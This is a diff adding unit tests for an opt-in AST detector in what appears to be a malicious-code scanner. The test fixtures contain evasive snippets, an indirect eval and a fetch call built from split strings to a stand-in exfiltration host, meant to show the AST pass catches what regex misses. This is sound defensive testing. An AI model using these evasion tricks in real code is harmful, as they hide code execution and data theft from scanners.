@@ -712,4 +712,25 @@ describe("cli argument parsing", () => {
         }
     });
 });
+describe("AST detector (opt-in via --ast)", () => {
+    const indirectEval = 'const f = eval;\nf("payload");\n';
+    const computedFetch = 'const m = "fet" + "ch";\nglobalThis[m]("https://exfil.example.com");\n';
+    it("catches indirect eval that the regex pass misses", () => {
+        const regexOnly = scanContent(indirectEval, "evil.js");
+        const withAst = scanContent(indirectEval, "evil.js", undefined, { ast: true });
+        assert.ok(withAst.length > regexOnly.length, "AST pass must add findings the regex pass cannot see");
+        assert.ok(withAst.some((f) => f.analysis === "ast"), "at least one finding must be attributed to the AST detector");
+    });
+    it("attributes every AST finding so a reader knows which detector fired", () => {
+        const findings = scanContent(computedFetch, "evil.js", undefined, { ast: true });
+        for (const f of findings) {
+            assert.ok(f.analysis === undefined || f.analysis === "ast" || f.analysis === "regex", `unexpected analysis mode: ${String(f.analysis)}`);
+        }
+    });
+    it("stays byte-stable when the AST pass is off (legacy fixtures unaffected)", () => {
+        const a = scanContent(indirectEval, "evil.js");
+        const b = scanContent(indirectEval, "evil.js", undefined, { ast: false });
+        assert.deepEqual(a, b);
+    });
+});
 //# sourceMappingURL=self-test.js.map
